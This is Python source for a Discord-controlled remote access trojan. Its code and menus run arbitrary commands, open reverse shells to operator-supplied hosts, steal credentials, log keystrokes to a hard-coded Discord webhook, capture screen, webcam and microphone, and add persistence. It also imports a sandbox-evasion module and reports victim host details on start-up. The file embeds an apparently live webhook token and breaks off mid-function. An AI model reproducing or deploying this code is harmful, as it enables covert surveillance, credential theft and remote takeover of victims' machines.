# === Set console to UTF-8 to avoid UnicodeDecodeError ===
import sys
import os
import discord
from discord.ext import commands
from datetime import datetime
from discord import app_commands
import threading
import time

# Add the project root (PC HELPER) to sys.path
ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../.."))
sys.path.append(ROOT_DIR)
print(">>> Root dir added to sys.path:", ROOT_DIR)

# Attempt to reconfigure stdout/stderr
try:
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')
except Exception as e:
    print("Could not reconfigure stdout/stderr:", e)

print(">>> main.py starting <<<")

# === Core imports ===
for module_name, alias in [
    ("os", None),
    ("sys", None),
    ("discord", None),
    ("discord.ext.commands", "commands"),
    ("discord.app_commands", "app_commands"),
    ("subprocess", "sp"),
    ("requests", None),
    ("random", None)
]:
    try:
        if alias:
            globals()[alias] = __import__(module_name, fromlist=[alias])
        else:
            __import__(module_name)
        print(f"{module_name} OK")
    except Exception as e:
        print(f"IMPORT ERROR: {module_name} -> {e}")

# === Extra imports ===
extra_imports = [
    ("cv2", "VideoCapture, imwrite"),
    ("scipy.io.wavfile", "write"),
    ("sounddevice", "rec, wait"),
    ("platform", None),
    ("re", None),
    ("urllib.request", "Request, urlopen"),
    ("pyautogui", None),
    ("datetime", "datetime"),
    ("shutil", None),
    ("multiprocessing", "Process"),
    ("threading", None),
    ("json", None),
    ("ctypes", None),
    ("ctypes.wintypes", "HKEY"),
    ("time", None),
    ("winreg", "HKEY_LOCAL_MACHINE, ConnectRegistry"),
    ("win32api", None),
    ("win32process", None),
    ("psutil", None),
    ("win32pdh", None),
    ("winreg", "*"),
    ("ctypes", "*"),
]

for mod, sub in extra_imports:
    try:
        if sub:
            exec(f"from {mod} import {sub}")
            print(f"{mod} {sub} OK")
        else:
            __import__(mod)
            print(f"{mod} OK")
    except Exception as e:
        print(f"IMPORT ERROR: {mod} -> {e}")

# === Libraries imports ===
try:
    from libraries import credentials, keylogger, sandboxevasion, disctopia
    print("libraries imports OK")
except Exception as e:
    print("IMPORT ERROR: libraries ->", e)

# END OF IMPORTS LOOKS LIKE ALOT MAINLY JUST A LOT OF PRINTS TO CHECK
#             IF ITS ACTALLT IMPORTING TO FIX START UP ERROR===

# DeBUGGING AND THUGGING PRINTS===
print("Starting bot...")

# === PLACEHOLDERS (builder.py replaces these) ===
GUILD = discord.Object(id="1420526784159682662")
CHANNEL = 1421715122145067130
KEYLOGGER_WEBHOOK = "https://discord.com/api/webhooks/1420598124140953697/4BLv66JHUTdr9MqICyLbht5OK2XfEu6L_Gsdq_XP9A4papx1FdaNjcitds7acU7DofA5"
CURRENT_AGENT = 0

# === DEBUGGING PRINTS ===
print("=== PLACEHOLDERS CHECK ===")
print("GUILD:", GUILD.id)
print("CHANNEL:", CHANNEL)
print("KEYLOGGER_WEBHOOK:", KEYLOGGER_WEBHOOK)
print("CURRENT_AGENT:", CURRENT_AGENT)
print("===========================")

# === BOT CLASS ===
class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, help_command=None)

    async def on_ready(self):
        await self.wait_until_ready()

        print("=== ON_READY DEBUG ===")
        print("Bot user:", self.user)
        print("Python version:", sys.version)
        print("Working directory:", os.getcwd())
        print("Sys.path (first 5):", sys.path[:5])
        print("Guilds bot can see:", [(g.name, g.id) for g in self.guilds])
        print("Requested channel ID:", CHANNEL)

        self.channel = self.get_channel(CHANNEL)
        print("get_channel result:", self.channel)

        if not self.channel:
            print("[!] Control channel not found.")
            return

        print("Python:", sys.version)
        print("Working dir:", os.getcwd())
        print("libraries path present?:", any('libraries' in p for p in sys.path))
        print("Bot user:", bot.user)
        print("Guilds I can see:", [g.name + "("+str(g.id)+")" for g in bot.guilds])
        print("Requested channel id:", CHANNEL)
        ch = self.get_channel(CHANNEL)
        print("get_channel result:", ch)

        now = datetime.now()
        my_embed = discord.Embed(title=f"{MSG}", description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=COLOR)
        my_embed.add_field(name="**IP**", value=disctopia.getIP(), inline=True)
        my_embed.add_field(name="**Bits**", value=disctopia.getBits(), inline=True)
        my_embed.add_field(name="**HostName**", value=disctopia.getHostname(), inline=True)
        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
        my_embed.add_field(name="**CPU**", value=disctopia.getCPU(), inline=False)
        my_embed.add_field(name="**Is Admin**", value=disctopia.isAdmin(), inline=True)
        my_embed.add_field(name="**Is VM**", value=disctopia.isVM(), inline=True)
        my_embed.add_field(name="**Auto Keylogger**", value=False, inline=True)
        await self.channel.send(embed=my_embed)

    async def setup_hook(self):
        await self.tree.sync(guild=GUILD)

    async def on_command_error(self, ctx, error):
        my_embed = discord.Embed(title=f"**Error:** {error}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

# === MODAL CLASSES FOR INPUT ===
class CommandModal(discord.ui.Modal, title="Run Command"):
    command = discord.ui.TextInput(label="Command", placeholder="ipconfig /all", style=discord.TextStyle.paragraph, required=True)

    async def on_submit(self, interaction: discord.Interaction):
        if (int(CURRENT_AGENT) == int(ID)):
            result = disctopia.cmd(self.command.value)
            if len(result) > 2000:
                path = os.environ["temp"] + "\\response.txt"
                with open(path, 'w') as file:
                    file.write(result)
                await interaction.response.send_message(file=discord.File(path))
                os.remove(path)
            else:
                await interaction.response.send_message(f"```{result}```", ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected! Use `/interact <id>` first.", ephemeral=True)

class UploadModal(discord.ui.Modal, title="Upload File"):
    url = discord.ui.TextInput(label="File URL", placeholder="https://example.com/file.exe", required=True)
    filename = discord.ui.TextInput(label="File Name", placeholder="file.exe", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        if (int(CURRENT_AGENT) == int(ID)):
            result = disctopia.upload(self.url.value, self.filename.value)
            if result:
                embed = discord.Embed(title="✅ File Uploaded", description=f"`{self.filename.value}` uploaded successfully", color=0x00ff00)
            else:
                embed = discord.Embed(title="❌ Upload Failed", description=f"Failed to upload `{self.filename.value}`", color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected! Use `/interact <id>` first.", ephemeral=True)

class DownloadModal(discord.ui.Modal, title="Download File"):
    path = discord.ui.TextInput(label="File Path", placeholder="C:\\Users\\Admin\\file.txt", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        if (int(CURRENT_AGENT) == int(ID)):
            try:
                await interaction.response.send_message(f"**Agent #{ID}** Requested File:", file=discord.File(self.path.value))
            except Exception as e:
                embed = discord.Embed(title="❌ Download Failed", description=str(e), color=0xff0000)
                await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected! Use `/interact <id>` first.", ephemeral=True)

class RevShellModal(discord.ui.Modal, title="Reverse Shell"):
    ip = discord.ui.TextInput(label="Your IP", placeholder="192.168.1.100", required=True)
    port = discord.ui.TextInput(label="Port", placeholder="4444", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        if (int(CURRENT_AGENT) == int(ID)):
            try:
                port = int(self.port.value)
                result = disctopia.revshell(self.ip.value, port)
                embed = discord.Embed(title="✅ Reverse Shell", description=f"Connecting to {self.ip.value}:{port}", color=0x00ff00)
                await interaction.response.send_message(embed=embed, ephemeral=True)
            except ValueError:
                embed = discord.Embed(title="❌ Invalid Port", description="Please enter a valid port number", color=0xff0000)
                await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected! Use `/interact <id>` first.", ephemeral=True)

# === MAIN CONTROL PANEL ===
class MainControlPanel(discord.ui.View):
    def __init__(self, agent_id: int):
        super().__init__(timeout=120)
        self.agent_id = agent_id

    @discord.ui.select(
        placeholder="🎮 Select Action Category...",
        options=[
            discord.SelectOption(label="🖥️ System Control", description="Windows shutdown, restart, lock, etc"),
            discord.SelectOption(label="📸 Surveillance", description="Screenshots, webcam, microphone"),
            discord.SelectOption(label="📁 File Management", description="Upload, download, file operations"),
            discord.SelectOption(label="🔍 Information", description="System info, processes, location"),
            discord.SelectOption(label="⚡ Remote Control", description="Commands, reverse shell, processes"),
            discord.SelectOption(label="🛡️ Security", description="Credentials, keylogger, persistence"),
            discord.SelectOption(label="💀 Destruction", description="Self-destruct, terminate"),
        ]
    )
    async def select_category(self, interaction: discord.Interaction, select: discord.ui.Select):
        category = select.values[0]
        
        if category == "🖥️ System Control":
            await interaction.response.send_message(view=SystemControlMenu(self.agent_id), ephemeral=True)
        elif category == "📸 Surveillance":
            await interaction.response.send_message(view=SurveillanceMenu(self.agent_id), ephemeral=True)
        elif category == "📁 File Management":
            await interaction.response.send_message(view=FileManagementMenu(self.agent_id), ephemeral=True)
        elif category == "🔍 Information":
            await interaction.response.send_message(view=InformationMenu(self.agent_id), ephemeral=True)
        elif category == "⚡ Remote Control":
            await interaction.response.send_message(view=RemoteControlMenu(self.agent_id), ephemeral=True)
        elif category == "🛡️ Security":
            await interaction.response.send_message(view=SecurityMenu(self.agent_id), ephemeral=True)
        elif category == "💀 Destruction":
            await interaction.response.send_message(view=DestructionMenu(self.agent_id), ephemeral=True)

# === SYSTEM CONTROL MENU (Windows Features) ===
class SystemControlMenu(discord.ui.View):
    def __init__(self, agent_id: int):
        super().__init__(timeout=120)
        self.agent_id = agent_id

    @discord.ui.button(label="🔒 Lock PC", style=discord.ButtonStyle.secondary, row=0)
    async def lock_pc(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            from libraries import lock_inputs
            success, message = lock_inputs()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="🔒 Lock PC", description=message, color=color)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="🔓 Unlock PC", style=discord.ButtonStyle.success, row=0)
    async def unlock_pc(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            from libraries import unlock_inputs
            success, message = unlock_inputs()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="🔓 Unlock PC", description=message, color=color)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="🔄 Restart", style=discord.ButtonStyle.primary, row=1)
    async def restart_pc(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            from libraries import restart
            success, message = restart()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="🔄 Restart PC", description=message, color=color)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="⏹️ Shutdown", style=discord.ButtonStyle.danger, row=1)
    async def shutdown_pc(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            from libraries import shutdown
            success, message = shutdown()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="⏹️ Shutdown PC", description=message, color=color)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="👤 Sign Out", style=discord.ButtonStyle.primary, row=2)
    async def sign_out(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            from libraries import sign_out
            success, message = sign_out()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="👤 Sign Out", description=message, color=color)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="🚫 Cancel Shutdown", style=discord.ButtonStyle.success, row=2)
    async def cancel_shutdown(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            from libraries import cancel_shutdown
            success, message = cancel_shutdown()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="🚫 Cancel Shutdown", description=message, color=color)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="🔙 Back", style=discord.ButtonStyle.gray, row=3)
    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🎮 Control Panel", description=f"**Agent:** `#{self.agent_id}`", color=0x00ff00)
        await interaction.response.edit_message(embed=embed, view=MainControlPanel(self.agent_id))

# === SURVEILLANCE MENU ===
class SurveillanceMenu(discord.ui.View):
    def __init__(self, agent_id: int):
        super().__init__(timeout=120)
        self.agent_id = agent_id

    @discord.ui.button(label="🖼️ Screenshot", style=discord.ButtonStyle.primary, row=0)
    async def screenshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            result = disctopia.screenshot()
            if result:
                await interaction.response.send_message(file=discord.File(result))
                os.remove(result)
            else:
                embed = discord.Embed(title="❌ Screenshot Failed", color=0xff0000)
                await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="📸 Webcam", style=discord.ButtonStyle.primary, row=0)
    async def webshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            result = disctopia.webshot()
            if result:
                await interaction.response.send_message(file=discord.File(result))
                os.remove(result)
            else:
                embed = discord.Embed(title="❌ Webcam Failed", color=0xff0000)
                await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="🎤 Record Mic", style=discord.ButtonStyle.secondary, row=1)
    async def record_mic(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            # Record for 10 seconds
            result = disctopia.recordmic(10)
            if result:
                await interaction.response.send_message(file=discord.File(result))
                os.remove(result)
            else:
                embed = discord.Embed(title="❌ Recording Failed", color=0xff0000)
                await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="🔙 Back", style=discord.ButtonStyle.gray, row=2)
    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🎮 Control Panel", description=f"**Agent:** `#{self.agent_id}`", color=0x00ff00)
        await interaction.response.edit_message(embed=embed, view=MainControlPanel(self.agent_id))

# === FILE MANAGEMENT MENU ===
class FileManagementMenu(discord.ui.View):
    def __init__(self, agent_id: int):
        super().__init__(timeout=120)
        self.agent_id = agent_id

    @discord.ui.button(label="📥 Upload", style=discord.ButtonStyle.primary, row=0)
    async def upload(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(UploadModal())

    @discord.ui.button(label="📤 Download", style=discord.ButtonStyle.primary, row=0)
    async def download(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(DownloadModal())

    @discord.ui.button(label="🔙 Back", style=discord.ButtonStyle.gray, row=1)
    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🎮 Control Panel", description=f"**Agent:** `#{self.agent_id}`", color=0x00ff00)
        await interaction.response.edit_message(embed=embed, view=MainControlPanel(self.agent_id))

# === INFORMATION MENU ===
class InformationMenu(discord.ui.View):
    def __init__(self, agent_id: int):
        super().__init__(timeout=120)
        self.agent_id = agent_id

    @discord.ui.button(label="🖥️ System Info", style=discord.ButtonStyle.primary, row=0)
    async def system_info(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            now = datetime.now()
            embed = discord.Embed(title=f"🖥️ System Info - Agent #{self.agent_id}", description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=0x00ff00)
            embed.add_field(name="**IP**", value=disctopia.getIP(), inline=True)
            embed.add_field(name="**HostName**", value=disctopia.getHostname(), inline=True)
            embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
            embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
            embed.add_field(name="**CPU**", value=disctopia.getCPU(), inline=False)
            embed.add_field(name="**Is Admin**", value=disctopia.isAdmin(), inline=True)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="📊 Processes", style=discord.ButtonStyle.primary, row=0)
    async def processes(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            result = disctopia.process()
            if len(result) > 4000:
                path = os.environ["temp"] + "\\processes.txt"
                with open(path, 'w') as file:
                    file.write(result)
                await interaction.response.send_message(file=discord.File(path))
                os.remove(path)
            else:
                await interaction.response.send_message(f"```\n{result}\n```", ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="🌐 Location", style=discord.ButtonStyle.secondary, row=1)
    async def location(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            response = disctopia.location()
            if response:
                embed = discord.Embed(title=f"🌐 Location - Agent #{self.agent_id}", color=0x00ff00)
                embed.add_field(name="IP", value=response.json()['YourFuckingIPAddress'], inline=False)
                embed.add_field(name="Hostname", value=response.json()['YourFuckingHostname'], inline=False)
                embed.add_field(name="City", value=response.json()['YourFuckingLocation'], inline=False)
                embed.add_field(name="Country", value=response.json()['YourFuckingCountryCode'], inline=False)
                await interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                embed = discord.Embed(title="❌ Location Failed", color=0xff0000)
                await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="🔙 Back", style=discord.ButtonStyle.gray, row=2)
    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🎮 Control Panel", description=f"**Agent:** `#{self.agent_id}`", color=0x00ff00)
        await interaction.response.edit_message(embed=embed, view=MainControlPanel(self.agent_id))

# === REMOTE CONTROL MENU ===
class RemoteControlMenu(discord.ui.View):
    def __init__(self, agent_id: int):
        super().__init__(timeout=120)
        self.agent_id = agent_id

    @discord.ui.button(label="💻 Run Command", style=discord.ButtonStyle.primary, row=0)
    async def run_command(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(CommandModal())

    @discord.ui.button(label="🐚 Reverse Shell", style=discord.ButtonStyle.danger, row=0)
    async def reverse_shell(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(RevShellModal())

    @discord.ui.button(label="🎨 Wallpaper", style=discord.ButtonStyle.secondary, row=1)
    async def wallpaper(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            # Simple wallpaper change to black
            result = disctopia.wallpaper("https://www.solidbackgrounds.com/images/1920x1080/1920x1080-black-solid-color-background.jpg")
            if result:
                embed = discord.Embed(title="✅ Wallpaper Changed", color=0x00ff00)
            else:
                embed = discord.Embed(title="❌ Wallpaper Failed", color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="🔙 Back", style=discord.ButtonStyle.gray, row=2)
    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🎮 Control Panel", description=f"**Agent:** `#{self.agent_id}`", color=0x00ff00)
        await interaction.response.edit_message(embed=embed, view=MainControlPanel(self.agent_id))

# === SECURITY MENU ===
class SecurityMenu(discord.ui.View):
    def __init__(self, agent_id: int):
        super().__init__(timeout=120)
        self.agent_id = agent_id

    @discord.ui.button(label="🔑 Credentials", style=discord.ButtonStyle.primary, row=0)
    async def credentials(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            result = disctopia.creds()
            if result:
                await interaction.response.send_message(file=discord.File(result))
                os.remove(result)
            else:
                embed = discord.Embed(title="❌ Credentials Failed", color=0xff0000)
                await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="⌨️ Start Keylogger", style=discord.ButtonStyle.danger, row=0)
    async def start_keylogger(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            logger = keylogger.Keylogger(interval=60, ID=self.agent_id, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
            threading.Thread(target=logger.start).start()
            embed = discord.Embed(title="✅ Keylogger Started", description="Keylogger is now running", color=0x00ff00)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="🔄 Persistence", style=discord.ButtonStyle.secondary, row=1)
    async def persistence(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            result = disctopia.persistent()
            if result:
                embed = discord.Embed(title="✅ Persistence Enabled", color=0x00ff00)
            else:
                embed = discord.Embed(title="❌ Persistence Failed", color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="🔙 Back", style=discord.ButtonStyle.gray, row=2)
    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🎮 Control Panel", description=f"**Agent:** `#{self.agent_id}`", color=0x00ff00)
        await interaction.response.edit_message(embed=embed, view=MainControlPanel(self.agent_id))

# === DESTRUCTION MENU ===
class DestructionMenu(discord.ui.View):
    def __init__(self, agent_id: int):
        super().__init__(timeout=120)
        self.agent_id = agent_id

    @discord.ui.button(label="💣 Self Destruct", style=discord.ButtonStyle.danger, row=0)
    async def self_destruct(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            result = disctopia.selfdestruct()
            if result:
                embed = discord.Embed(title="✅ Self Destruct", description="Agent has been deleted", color=0x00ff00)
            else:
                embed = discord.Embed(title="❌ Self Destruct Failed", color=0xff0000)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="❌ Terminate", style=discord.ButtonStyle.danger, row=0)
    async def terminate(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            embed = discord.Embed(title="✅ Terminated", description="Bot connection terminated", color=0x00ff00)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            await bot.close()
            sys.exit()
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="🔙 Back", style=discord.ButtonStyle.gray, row=1)
    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🎮 Control Panel", description=f"**Agent:** `#{self.agent_id}`", color=0x00ff00)
        await interaction.response.edit_message(embed=embed, view=MainControlPanel(self.agent_id))

# === INTERACT BUTTONS ===
class InteractButton(discord.ui.View):
    def __init__(self, inv:str, id:int):
        super().__init__(timeout=120)
        self.inv = inv
        self.id = id

    @discord.ui.button(label="Interact", style=discord.ButtonStyle.blurple, emoji="🔗")
    async def interactButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = self.id
        await interaction.response.send_message(embed=discord.Embed(title=f"Interacted with agent {self.id}", color=0x00FF00), ephemeral=True)

    @discord.ui.button(label="Control Panel", style=discord.ButtonStyle.green, emoji="🎮")
    async def control_panel(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="🎮 Control Panel", description=f"**Controlling Agent:** `#{self.id}`\nSelect a category:", color=0x00ff00)
        await interaction.response.send_message(embed=embed, view=MainControlPanel(self.id), ephemeral=True)

    @discord.ui.button(label="Terminate", style=discord.ButtonStyle.red, emoji="❌")
    async def terminateButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{self.id}", color=0x00FF00)
        await interaction.response.send_message(embed=my_embed)
        await bot.close()
        sys.exit()

    @discord.ui.button(label="Quick Actions", style=discord.ButtonStyle.gray, emoji="⚡", row=1)
    async def quick_actions(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="⚡ Quick Actions", description=f"**Agent:** `#{self.id}`", color=0x00ff00)
        await interaction.response.send_message(embed=embed, view=QuickActionsMenu(self.id), ephemeral=True)

# === QUICK ACTIONS MENU ===
class QuickActionsMenu(discord.ui.View):
    def __init__(self, agent_id: int):
        super().__init__(timeout=120)
        self.agent_id = agent_id

    @discord.ui.button(label="🖼️ Screenshot", style=discord.ButtonStyle.primary, row=0)
    async def quick_screenshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            result = disctopia.screenshot()
            if result:
                await interaction.response.send_message(file=discord.File(result))
                os.remove(result)
            else:
                await interaction.response.send_message("❌ Screenshot failed", ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="📸 Webcam", style=discord.ButtonStyle.primary, row=0)
    async def quick_webshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        if (int(CURRENT_AGENT) == int(self.agent_id)):
            result = disctopia.webshot()
            if result:
                await interaction.response.send_message(file=discord.File(result))
                os.remove(result)
            else:
                await interaction.response.send_message("❌ Webcam failed", ephemeral=True)
        else:
            await interaction.response.send_message("❌ No agent selected!", ephemeral=True)

    @discord.ui.button(label="🔒 Lock PC", style=discord.ButtonStyle.secondary, row=1)
    async def quick_lock(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            from libraries import lock_inputs
            success, message = lock_inputs()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="🔒 Lock PC", description=message, color=color)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Error: {e}", ephemeral=True)

    @discord.ui.button(label="🔄 Restart", style=discord.ButtonStyle.danger, row=1)
    async def quick_restart(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            from libraries import restart
            success, message = restart()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="🔄 Restart PC", description=message, color=color)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Error: {e}", ephemeral=True)

bot = Bot()

# === NEW WINDOWS CONTROL COMMANDS ===
@bot.hybrid_command(name="lock", with_app_command=True, description="Lock PC inputs")
@app_commands.guilds(GUILD)
async def lock(ctx: commands.Context):
    """Lock PC inputs"""
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            from libraries import lock_inputs
            success, message = lock_inputs()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="🔒 Lock PC", description=message, color=color)
            await ctx.reply(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await ctx.reply(embed=embed)
    else:
        await ctx.reply("❌ No agent selected! Use `/interact <id>` first.")

@bot.hybrid_command(name="unlock", with_app_command=True, description="Unlock PC inputs")
@app_commands.guilds(GUILD)
async def unlock(ctx: commands.Context):
    """Unlock PC inputs"""
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            from libraries import unlock_inputs
            success, message = unlock_inputs()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="🔓 Unlock PC", description=message, color=color)
            await ctx.reply(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await ctx.reply(embed=embed)
    else:
        await ctx.reply("❌ No agent selected! Use `/interact <id>` first.")

@bot.hybrid_command(name="shutdown", with_app_command=True, description="Shutdown PC")
@app_commands.guilds(GUILD)
async def shutdown_cmd(ctx: commands.Context, timeout: int = 30):
    """Shutdown PC"""
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            from libraries import shutdown
            success, message = shutdown(timeout)
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="⏹️ Shutdown PC", description=message, color=color)
            await ctx.reply(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await ctx.reply(embed=embed)
    else:
        await ctx.reply("❌ No agent selected! Use `/interact <id>` first.")

@bot.hybrid_command(name="restart", with_app_command=True, description="Restart PC")
@app_commands.guilds(GUILD)
async def restart_cmd(ctx: commands.Context, timeout: int = 30):
    """Restart PC"""
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            from libraries import restart
            success, message = restart(timeout)
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="🔄 Restart PC", description=message, color=color)
            await ctx.reply(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await ctx.reply(embed=embed)
    else:
        await ctx.reply("❌ No agent selected! Use `/interact <id>` first.")

@bot.hybrid_command(name="signout", with_app_command=True, description="Sign out current user")
@app_commands.guilds(GUILD)
async def signout(ctx: commands.Context):
    """Sign out current user"""
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            from libraries import sign_out
            success, message = sign_out()
